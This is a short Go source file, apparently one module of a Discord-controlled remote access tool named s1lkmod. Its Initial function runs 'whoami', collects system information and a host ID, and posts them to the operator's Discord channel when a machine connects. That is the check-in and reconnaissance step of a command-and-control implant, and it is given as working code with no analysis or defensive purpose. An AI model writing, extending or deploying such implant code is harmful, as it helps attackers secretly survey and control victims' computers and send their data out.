package info_gather

import (
	"fmt"
	"s1lkmod/pkg/modules/cmd"

	"github.com/bwmarrin/discordgo"
)

// The function that will handle the initial information gathering of the system.
func Initial(session *discordgo.Session, channelId, hostID string) {

	// Creates an object of the channel that we specified
	channel, _ := session.Channel(channelId)
	msgformat := fmt.Sprintf("```\nThe following has connected: %s\nHost ID: %s\n%s```", cmd.Arkor("whoami"), hostID, SystemInfo())
	session.ChannelMessageSend(channel.ID, msgformat)

}
